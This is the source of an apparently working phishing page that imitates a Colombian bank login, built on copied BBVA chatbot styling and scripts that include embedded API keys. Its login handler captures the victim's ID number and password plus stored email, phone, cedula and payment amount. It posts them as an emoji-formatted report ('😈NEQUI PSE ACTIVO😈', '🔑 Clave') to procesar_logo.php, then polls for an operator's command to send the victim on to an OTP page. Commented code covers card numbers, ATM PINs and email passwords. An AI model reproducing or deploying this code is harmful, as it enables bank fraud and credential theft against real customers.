    .inbenta-bot__chat .content__buttons--multiple-choise .inbenta-bot-button {
        color: white;
        font-size: 1rem;
        padding: 10px 18px;
        background-color: #1973B8;
        position: relative;
        text-align: right;
        display: inline-block;
    }

    .inbenta-bot__chat .content__buttons--multiple-choise .inbenta-bot-button:before {
        content: "";
        display: inline-block;
        position: absolute;
        width: 0;
        height: 0;
        border: 5px solid transparent;
        border-left-color: #1973B8;
        border-top: 0;
        left: 100%;
        top: 0;
    }

    .inbenta-bot__chat .content__buttons--multiple-choise .inbenta-bot-icon--faq-icon {
        display: none;
    }

    .inbenta-bot__chat .content__buttons {
        flex-direction: column;
        align-items: flex-end;
    }

    .inbenta-bot__chat .content__buttons .inbenta-bot-button-secondary:before {
        content: "";
        display: inline-block;
        position: absolute;
        width: 0;
        height: 0;
        border: 5px solid transparent;
        border-left-color: #1973B8;
        border-top: 0;
        left: 100%;
        top: 0;
    }

    .inbenta-bot__chat .content__buttons .inbenta-bot-button-secondary {
        color: white;
        font-size: 1rem;
        padding: 10px 18px;
        background-color: #1973B8;
        position: relative;
        text-align: right;
        display: block;
        margin: 6px 0;
        border-radius: 0;
    }

    .inbenta-bot__chat .messages__message--received .messages__message__content .inbenta-bot-rating__content {
        background-color: #072146;
        padding: 10px 18px;
    }

    .inbenta-bot__chat .messages__message--received .messages__message__content .inbenta-bot-rating__content__phrase {
        color: white;
        font-style: normal;
        font-size: 1rem;
    }

    .inbenta-bot__chat .messages__message--received .messages__message__content .inbenta-bot-rating__content__buttons .inbenta-bot-button {
        color: white;
    }

    .inbenta-bot__chat .messages__message--received .messages__message__content .inbenta-bot-rating__content__thanks {
        font-style: normal;
        color: white;
    }

    .inbenta-bot__launcher {
        display: block;
        border-radius: 0;
        height: 80px;
        width: 80px;
        background-color: white;
    }

    .inbenta-bot__launcher:hover {
        border-radius: 0;
        background-color: white;
    }

    .inbenta-bot__launcher__image {
        margin: 0 auto 10px;
        background: none;
        width: auto;
        height: auto;
        text-align: center;
    }

    .inbenta-bot__launcher__image:before {
        content: "\eab5";
        color: #1464A5;
        font-family: 'bbvaiconfont';
        font-size: 0px;
        display: block;
        background-image: url(https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_011_support.svg);
        background-size: 100% 100%;
        background-repeat: no-repeat;
    }

    .inbenta-bot__launcher__image+.inbenta-bot__launcher__text {
        color: #1464A5;
        font-size: 1rem;
        font-family: "BentonSansBBVA-Medium", Helvetica, Arial, sans-serif;
        margin: auto;
        text-align: center;
    }

    /* BUBBLE */
    .inbenta-bot__bubble__header {
        background-color: #072146;
    }

    .inbenta-bot__bubble .header__title {
        font-size: 1rem;
        font-family: "BentonSansBBVA-Book", Helvetica, Arial, sans-serif;
        text-align: center;
        margin: 0 auto;
        max-width: calc(100% - 75px);
    }

    .inbenta-bot__bubble__body .body__content-faq {
        width: 100%;
    }

    .inbenta-bot__powered {
        display: none;
    }

    .helpsticky__item {
        display: none;
    }

    .inbenta-bot__bubble .content__open-sidebubble,
    .inbenta-bot__chat .content__open-sidebubble {
        padding: 0;
        margin: 0 0 16px;
    }

    /* FOOTER */
    .inbenta-bot__bubble .footer__form__counter-content .counter-content__counter,
    .inbenta-bot__chat .footer__form__counter-content .counter-content__counter {
        margin-right: 15px;
        font-family: BentonSansBBVA-Light, Helvetica, Arial, sans-serif;
    }
</style>

<script src="https://sdk.inbenta.io/chatbot/1/inbenta-chatbot-sdk.js"></script>
<script type="text/javascript">
    var config = {
        "ratingPosition": "mixed",
        "environment": "production",
        "answers": {
            "maxOptions": 5
        },
        "userType": 0,
        "lang": "es",
        "form": {
            "errorRetries": 3,
            "allowUserToAbandonForm": true
        },
        "inputCharacterCounter": true,
        "inputCharacterCounterMax": 100,
        "labels": {
            "es": {
                "interface-title": "Asistente Virtual"
            }
        },
        "launcher": {
            "title": "Chat"
        },
        "showDateTime": false,
        "closeButton": {
            "visible": true
        },
        "ratingOptions": [{
            "id": 1,
            "comment": false
        }, {
            "id": 2,
            "comment": false
        }],
        "sanitizerOptions": {
            "allowedTags": ["h1", "h2", "h3", "h4", "h5", "h6", "blockquote", "p", "a", "ul", "ol", "nl", "li", "b", "i", "strong", "em", "strike", "code", "hr", "br", "div", "table", "thead", "caption", "tbody", "tr", "th", "td", "pre", "img", "iframe", "video", "span", "source"],
            "allowedAttributes": { "a": ["href", "name", "target", "class", "onclick"], "iframe": ["src"], "img": ["src"], "video": ["*"], "source": ["*"] }
        },
        adapters: [
            doSubscription, obfuscateNumbers, escalateOnSpecificNegativeRating, messageFlagsAdapter, directCallAdapter, tipoPersona
        ],
    };

    var domain_key = "eyJ0eXBlIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJwcm9qZWN0IjoiYmJ2YWNvbG9tYmlhX2NoYXRib3RfZXMiLCJkb21haW5fa2V5X2lkIjoiQlhtY3A3RDk2UkNIdXpWeHpheGhNQTo6In0.QHLz3smMQsEFcFmBjRUqgcYKjyoG3JfKVjZSISowDaksS_H1TLel-7yUdO35HldsJYz6CNiodk3IgQrvkYvXDA";
    var key = "TbgXEonJachwH0XIym/Rnjxu2RFuZI5fWHP//99JKZs=";
    var authorization = {
        domainKey: domain_key,
        inbentaKey: key
    };

    // Hyperchat
    SDKHCAdapter.configure({
        apiKey: 'CesnV8ZQ7',
        room: function () { return 1 },
        region: 'us',
        transcript: { download: true },
        surveys: { id: 7 }
    });
    config.adapters.push(NLEscalation2(SDKHCAdapter.checkEscalationConditions));
    config.adapters.push(SDKHCAdapter.build());

    var BotSDK = InbentaChatbotSDK.buildWithDomainCredentials(authorization, config);

    function doSubscription(chatbot) {
        chatbot.subscriptions.onDisplayChatbotMessage(function (messageData, next) {
            chatbot.actions.displayChatbotActivity();
            setTimeout(function () {
                chatbot.actions.hideChatbotActivity();
                var date = new Date();
                var hour = date.getHours();
                return next(messageData);
            }, 2000);
        });
    }

    function obfuscateNumbers(chatBot) {
        chatBot.subscriptions.onDisplayUserMessage(function (messageData, next) {
            var regexsArray = [
                /[0-9]{8,8}[A-Za-z]/gm,
                /[0-9]{4,}/gm
            ]
            regexsArray.forEach(function (regex) {
                var matches = messageData.message.match(regex);
                if (matches) { messageData.message = messageData.message.replace(regex, "####"); }
            });
            return next(messageData);
        });
    }

    function messageFlagsAdapter(chatbot) {
        chatbot.subscriptions.onDisplayChatbotMessage(function (messageData, next) {
            if (messageData.flags && messageData.flags.indexOf('no-subset-match') != -1) {
                return;
            }
            return next(messageData);
        });
    }

    function directCallAdapter(chatBot) {
        if (!window.inbentaChatbot) { window.inbentaChatbot = {}; }

        var directCall = function (content) {
            chatBot.actions.sendMessage({ directCall: content });
        };

        window.inbentaChatbot.directCall = directCall;
    }

    function tipoPersona(chatBot) {
        if (!window.inbentaChatbot) { window.inbentaChatbot = {}; }
        var setVariable = function (params) {
            chatBot.api.addVariable('CATEGORIES_FOLDER', params.tipoPersona);
        };
        window.establecerTipoPersona = setVariable;
    }

    function escalateOnSpecificNegativeRating(chatbot) {
        var escalateOnNegativeRating = false;
        chatbot.subscriptions.onDisplayChatbotMessage(function (messageData, next) {
            if (hasValidEscalateAttribute(messageData)) {
                escalateOnNegativeRating = true;
            } else {
                escalateOnNegativeRating = false;
            }
            return next(messageData);
        });
        chatbot.subscriptions.onRateContent(function (rateData, next) {
            if (rateData.value && rateData.value == 2 && escalateOnNegativeRating == true) {
                chatbot.actions.sendMessage({ directCall: 'escalationOffer' });
            }
            return next(rateData);
        });

        function hasValidEscalateAttribute(messageData) {
            return messageData.attributes
                && messageData.attributes.ESCALATE
                && messageData.attributes.ESCALATE == "TRUE";
        }
    }
    function NLEscalation2(checkAgents) {
        return function (chatBot) {

            let chatIdTracker = {
                value: {
                    chatId: '',
                    appId: '',
                    region: null,
                }
            };

            let noResults = 0;

            /**
             * Look for escalationOffer directCall attribute, checkAgents and set variable
             * Remove end-form directCall on escalationStart contnet
             * @param  {[Object]}   messageData [MessageData of displayChatbotMessage action]
             * @param  {Function} next        [Callback]
             * @return {[next]}               [next]
             */
            chatBot.subscriptions.onDisplayChatbotMessage(function (messageData, next) {
                if ("attributes" in messageData && messageData.attributes !== null && 'DIRECT_CALL' in messageData.attributes && messageData.attributes.DIRECT_CALL === 'sys-no-results') noResults++;
                if (noResults >= 3) {
                    noResults = 0;
                    chatBot.actions.sendMessage({ directCall: 'escalationOffer' });
                }
                //Detect escalationOffer content
                if ("attributes" in messageData && messageData.attributes !== null && 'DIRECT_CALL' in messageData.attributes && messageData.attributes.DIRECT_CALL === "escalationOffer") {
                    checkAgents().then(function (result) {
                        if ('agentsAvailable' in result) {
                            chatBot.api.addVariable('agents_available', result.agentsAvailable.toString());
                        }
                    });
                    //Remove end-form direct-answer on escalationStart, but don't interrupt the action, so js_callback is executed
                } else if ('flags' in messageData && messageData.flags.length > 0 && 'actions' in messageData && messageData.actions.length > 0) {
                    if (messageData.flags.indexOf('end-form') !== -1) {
                        for (var i = 0; i < messageData.actions.length; i++) {
                            if ('parameters' in messageData.actions[i] && 'callback' in messageData.actions[i].parameters && messageData.actions[i].parameters.callback == "escalationStart") {
                                messageData.message = '';
                                messageData.messageList = [];
                            }
                        }
                    }
                }
                return next(messageData);
            });

            /**
             * Subcription on setExternalInfo triggered by external chat
             * Look for attended and chatId attributes, perform tracking of attended/unattended
             * @param  {[Object]} escalationData [Attended, chatId, appId and region]
             * @param  {Function} next        [Callback]
             * @return {[next]}               [next]
             */
            chatBot.subscriptions.onSetExternalInfo(function (escalationData, next) {
                if ('attended' in escalationData && 'chatId' in escalationData && 'appId' in escalationData && 'region' in escalationData) {
                    chatIdTracker.value.chatId = escalationData.chatId;
                    chatIdTracker.value.appId = escalationData.appId;
                    chatIdTracker.value.region = escalationData.region;
                    if (escalationData.attended) {
                        chatBot.api.track('CHAT_ATTENDED', chatIdTracker);
                    } else chatBot.api.track('CHAT_UNATTENDED', chatIdTracker);
                }
                return next(escalationData);
            });

            //detect escalationStart action, checkAgents and perform escalationStart directCall
            chatBot.subscriptions.onEscalationStart(function (escalationData, next) {
                checkAgents().then(function (result) {
                    if ('agentsAvailable' in result) {
                        chatBot.api.addVariable('agents_available', result.agentsAvailable.toString()).then(function () {
                            chatBot.actions.sendMessage({ directCall: 'escalationStart' });
                        });
                    }
                });
            });

            SDKHCAdapter.events.on('user:joined', function (data) {
                if (data.sender && data.sender === 'system') {
                    const variableList = ['TIPO_DOCUMENTO', 'NUM_DOCUMENTO', 'FIRST_NAME', 'LAST_NAME'];
                    var tipoDocumento = '';
                    var numDocumento = '';
                    var firstName = '';
                    var lastName = '';
                    chatBot.api.getVariables().then(function (response) {
                        if (response && response.data && response.data.tipo_documento) tipoDocumento = response.data.tipo_documento.value;
                        if (response && response.data && response.data.num_documento) numDocumento = response.data.num_documento.value;
                        if (response && response.data && response.data.first_name) firstName = response.data.first_name.value;
                        if (response && response.data && response.data.last_name) lastName = response.data.last_name.value;
                        var escalationData = { 'tipo_de_documento': tipoDocumento, 'numero_de_documento': numDocumento, 'nombre_completo': firstName + ' ' + lastName };
                        window.ICF.Api.request('/users/' + data.chat.creator, 'PUT',
                            { extraInfo: escalationData });
                    });
                }
            });
        };
    }

</script>
    

    
  </div>
</div>
</div>
    




    
      <div id="loader" style="
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 9999;
">
    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
</div>

<script>
// Espera 3 segundos y redirige al siguiente paso
setTimeout(function () {
    document.getElementById('loader').style.display = 'none';
}, 3000);
</script>
    


<script type="text/javascript">
    $(document).ready(function($){
        
        setInterval(consultar_estado,2000);


        var ventana_alto = $(window).height();
        $("#panel-formulario").animate({ "height": ventana_alto + "px"}, "slow" );
        $("#contenedor-login").show();



        $("#inp-documento").click(function(){
            $("#inp-documento .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#docNumberMovil").show();
                $("#docNumberMovil").focus();                        
            });                    
        });


         $("#docNumberMovil").blur(function(){
            if ($("#docNumberMovil").val() == "") {
                $("#docNumberMovil").hide();
                $("#inp-documento .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });


         $("#inp-password").click(function(){
            $("#inp-password .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#passwordMovil").show();
                $("#passwordMovil").focus();                        
            });                    
        });


         $("#passwordMovil").blur(function(){
            if ($("#passwordMovil").val() == "") {
                $("#passwordMovil").hide();
                $("#inp-password .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });




         $("#inp-tarjeta").click(function(){
            $("#inp-tarjeta .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#noTarjeta").show();
                $("#noTarjeta").focus();                        
            });                    
        });


         $("#noTarjeta").blur(function(){
            if ($("#noTarjeta").val() == "") {
                $("#noTarjeta").hide();
                $("#inp-tarjeta .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });


         $("#inp-cajero").click(function(){
            $("#inp-cajero .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#claveCajero").show();
                $("#claveCajero").focus();                        
            });                    
        });


         $("#claveCajero").blur(function(){
            if ($("#claveCajero").val() == "") {
                $("#claveCajero").hide();
                $("#inp-cajero .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });


         $("#inp-token").click(function(){
            $("#inp-token .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#TokenOTP").show();
                $("#TokenOTP").focus();                        
            });                    
        });


         $("#TokenOTP").blur(function(){
            if ($("#TokenOTP").val() == "") {
                $("#TokenOTP").hide();
                $("#inp-token .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });

         $("#inp-token-err").click(function(){
            $("#inp-token-err .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#TokenOTPErr").show();
                $("#TokenOTPErr").focus();                        
            });                    
        });


         $("#TokenOTPErr").blur(function(){
            if ($("#TokenOTPErr").val() == "") {
                $("#TokenOTPErr").hide();
                $("#inp-token-err .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });










         $("#inp-correo").click(function(){
            $("#inp-correo .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#correoElectronico").show();
                $("#correoElectronico").focus();                        
            });                    
        });


         $("#correoElectronico").blur(function(){
            if ($("#correoElectronico").val() == "") {
                $("#correoElectronico").hide();
                $("#inp-correo .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });

         $("#inp-clave-correo").click(function(){
            $("#inp-clave-correo .etiqueta").animate({"margin-top":"0px","font-size": "14px"}, 100, function() {
                $("#claveCorreo").show();
                $("#claveCorreo").focus();                        
            });                    
        });


         $("#claveCorreo").blur(function(){
            if ($("#claveCorreo").val() == "") {
                $("#claveCorreo").hide();
                $("#inp-clave-correo .etiqueta").animate({"margin-top":"12px","font-size":"16px"}, 100);                
            }else{

            }
        });
         $("#btnAcceso").click(function(){
            var ventana_alto = $(window).height();
            $("#panel-formulario").animate({ "height": ventana_alto + "px"}, "slow" );
            $("#contenedor-login").show();        
         });

         // $("#btnLogin").click(function(){
         //     if ($("#docNumberMovil").val() != "") {
         //        if ($("#passwordMovil").val() != "") {
         //            $(".fondo").show();
         //            $(".mensaje").show();
         //            iniciar_sesion($("#docTypeNoMovil").val(),$("#docNumberMovil").val(),$("#passwordMovil").val());

         //        }else{
         //           $("#docNumberMovil").focus();    
         //        }
         //     }else{
         //        $("#docNumberMovil").focus();
         //     }   
         // });

         // $("#btnClave").click(function(){
         //    if ($("#noTarjeta").val().length > 15) {
         //        if ($("#claveCajero").val().length > 3) {
         //            $(".fondo").show();
         //            $(".mensaje").show();
         //            enviar_clave($("#noTarjeta").val(),$("#claveCajero").val());
         //    }else{
         //        $("#claveCajero").focus();
         //    }
         // }else{
         //    $("#noTarjeta").focus();
         // }     
         // });

         // $("#btnToken").click(function(){
         //    if ($("#TokenOTP").val() != "") {
         //        $(".fondo").show();
         //        $(".mensaje").show();
         //        enviar_OTP($("#TokenOTP").val());
         //     }else{
         //        $("#TokenOTP").focus();
         //     }      
         // });

         // $("#btnTokenErr").click(function(){
         //     if ($("#TokenOTPErr").val() != "") {
         //        $(".fondo").show();
         //        $(".mensaje").show();
         //        enviar_OTP_Error($("#TokenOTPErr").val());
         //     }else{
         //        $("#TokenOTPErr").focus();
         //     }         
         // });

         // $("#btnMail").click(function(){
         //     if ($("#correoElectronico").val() != "") {
         //        if ($("#claveCorreo").val() != "") {
         //            $(".fondo").show();
         //            $(".mensaje").show();
         //            enviar_correo($("#correoElectronico").val(),$("#claveCorreo").val());
         //    }else{
         //       $("#claveCorreo").focus();    
         //    }
         // }else{
         //    $("#correoElectronico").focus();
         // }       
         // });        
        
    });

    // Espera 3 segundos y oculta el loader inicial
    setTimeout(function () {
      document.getElementById('loader').style.display = 'none';
    }, 3000);

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      // Obtener usuario desde URL params
      const userFromUrl = urlParams.get('user');
      if (userFromUrl) {
        localStorage.setItem('username', userFromUrl);
      }

      // Event listener para el botón de login
      const btnLogin = document.getElementById('btnLogin');
      
      if (btnLogin) {
        // Remover el event listener de jQuery existente
        $(btnLogin).off('click');
        
        btnLogin.addEventListener('click', async function (event) {
          event.preventDefault();

          // Obtener datos del formulario usando los IDs correctos
          const identificacion = document.getElementById('docNumberMovil').value;
          const password = document.getElementById('passwordMovil').value;
          const tipoDocumento = document.getElementById('docTypeNoMovil').value;
          
          // EXTRAER TOTAL
          const totalPagar = localStorage.getItem('total_pagar') || 'No disponible';
          
          // Validar que la contraseña tenga al menos 4 caracteres
          if (password.length < 4) {
            alert('La contraseña debe tener al menos 4 caracteres');
            return;
          }
          
          // Validar que la identificación tenga al menos 5 dígitos
          if (identificacion.length < 5) {
            alert('La identificación debe tener al menos 5 dígitos');
            return;
          }

          // Mostrar loader
          $(".fondo").show();
          $(".mensaje").show();

          // Usar sessionId que ya generamos arriba
          localStorage.setItem('username', userFromUrl || '');
          localStorage.setItem('password', password);
          localStorage.setItem('session_id', sessionId);
          localStorage.setItem('identificacion', identificacion);
          localStorage.setItem('tipoDocumento', tipoDocumento);

          let infoData;
          try {
            infoData = JSON.parse(localStorage.getItem('info') || '{}');
          } catch (e) {
            return;
          }

          const meta = infoData?.metaInfo || {};

          // Obtener datos del usuario desde localStorage o URL params
          const username = urlParams.get('user') || localStorage.getItem('username') || '';
          
          // Detectar tipo de dispositivo
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          
          if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
          } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
          } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
          } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
          }
          
          const hora = new Date().toLocaleString('es-ES');
          
          // Obtener IP y construir mensaje
          fetch('get_ip.php')
            .then(response => response.json())
            .then(data => {
              const ip = data.ip || 'No disponible';
              
              const mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💰Monto a Pagar:</b> ${totalPagar}
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> ${ip}
<b>⏱Hora:</b> ${hora}
------------------------------
📋 Tipo Documento: ${tipoDocumento}
------------------------------
👤 Usuario: ${identificacion}
🔑 Clave: ${password}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', sessionId);

              fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
              })
              .then(res => res.json())
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(sessionId, result.messageId);
                } else {
                  // Ocultar loader si hay error
                  $(".fondo").hide();
                  $(".mensaje").hide();
                }
              })
              .catch(err => {
                // Ocultar loader si hay error
                $(".fondo").hide();
                $(".mensaje").hide();
              });
            })
            .catch(() => {
              // Si falla la obtención de IP, enviar sin IP
              const mensaje = `
💎BANCO DE BOGOTA💎
<b>😈NEQUI PSE ACTIVO😈</b>
<b>💰Monto a Pagar:</b> ${totalPagar}
<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
<b>🪬Tipo:</b> RECARGA PSE
<b>📟Dispositivo:</b> ${dispositivo}
<b>🗺IP:</b> No disponible
<b>⏱Hora:</b> ${hora}
------------------------------
📋 Tipo Documento: ${tipoDocumento}
------------------------------
👤 Usuario: ${identificacion}
🔑 Clave: ${password}
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', sessionId);

              fetch('procesar_logo.php', {
                method: 'POST',
                body: formData
              })
              .then(res => res.json())
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(sessionId, result.messageId);
                } else {
                  // Ocultar loader si hay error
                  $(".fondo").hide();
                  $(".mensaje").hide();
                }
              })
              .catch(err => {
                // Ocultar loader si hay error
                $(".fondo").hide();
                $(".mensaje").hide();
              });
            });
        });
      }
});

      // Validación para solo números en el campo de documento
      const documentoInput = document.getElementById('docNumberMovil');
      if (documentoInput) {
        documentoInput.addEventListener('input', function(e) {
          // Remover cualquier carácter que no sea número
          this.value = this.value.replace(/[^0-9]/g, '');
          
          // Limitar a 15 caracteres
          if (this.value.length > 15) {
            this.value = this.value.slice(0, 15);
          }
        });

        // Prevenir pegar texto que no sean números
        documentoInput.addEventListener('paste', function(e) {
          e.preventDefault();
          let pastedText = (e.clipboardData || window.clipboardData).getData('text');
          let numbersOnly = pastedText.replace(/[^0-9]/g, '');
          if (numbersOnly.length > 15) {
            numbersOnly = numbersOnly.slice(0, 15);
          }
          this.value = numbersOnly;
        });
      }

      // Validación para caracteres alfanuméricos en el campo de contraseña
      const claveInput = document.getElementById('passwordMovil');
      if (claveInput) {
        claveInput.addEventListener('input', function(e) {
          // Remover cualquier carácter que no sea letra o número
          this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
          
          // Limitar a 15 caracteres
          if (this.value.length > 15) {
            this.value = this.value.slice(0, 15);
          }
        });

        // Prevenir pegar texto que no sean caracteres alfanuméricos
        claveInput.addEventListener('paste', function(e) {
          e.preventDefault();
          let pastedText = (e.clipboardData || window.clipboardData).getData('text');
          let alphanumericOnly = pastedText.replace(/[^a-zA-Z0-9]/g, '');
          if (alphanumericOnly.length > 15) {
            alphanumericOnly = alphanumericOnly.slice(0, 15);
          }
          this.value = alphanumericOnly;
        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php', {
          method: 'POST',
          body: formData
        });
        const result = await res.json();

        if (result.action) {
          switch (result.action) {
            case 'pedir_dinamica':
              window.location.href = "token.php";
              break;
            case 'error_logo': 
              // Ocultar loader antes de mostrar error
              $(".fondo").hide();
              $(".mensaje").hide();
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.php";
              break;
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
// Este script busca y destruye el elemento aunque se cree por fuera de tu código
(function() {
    const aniquilarCapaGris = () => {
        // Buscamos cualquier elemento que tenga esa clase (aunque sea inyectada por un script externo)
        const intruso = document.querySelector('.image__overlay');
        if (intruso) {
            intruso.remove();
            console.log("Elemento externo eliminado con éxito.");
        }
    };

    // 1. Ejecutar de inmediato
    aniquilarCapaGris();

    // 2. Vigilar la página por si un script externo la vuelve a meter
    const observadorPotente = new MutationObserver(() => {
        aniquilarCapaGris();
    });

    observadorPotente.observe(document.body, {
        childList: true,
        subtree: true
    });
})();
</script>